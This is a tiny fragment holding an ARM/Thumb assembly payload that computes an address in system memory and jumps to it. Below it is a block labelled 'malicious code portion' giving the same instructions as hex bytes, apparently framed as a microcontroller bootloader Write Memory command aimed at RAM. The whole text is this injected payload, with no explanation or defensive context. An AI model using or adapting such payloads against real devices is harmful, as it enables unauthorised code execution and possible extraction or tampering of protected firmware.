movs    r0, #0x42
mov     r2, #0x02                   
mov     r2, r2, LSL #28
mov     r3, #0x10
mov     r3, r3, LSL #8
sub     r2, r2, r3
add     r2, r2, #0x29
mov     pc, r2
NOP

Write Memory (malicious code portion):
31 CE
20003000 10
1D              ; 29+1 bytes
2A20
4FF00202
4FEA0272
4FF01003
4FEA0323
A2EB0302
02F12902
9746
00BF            ; 2A204FF002024FEA02724FF010034FEA0323A2EB030202F12902974600BF(A01A8489, B7)
AA
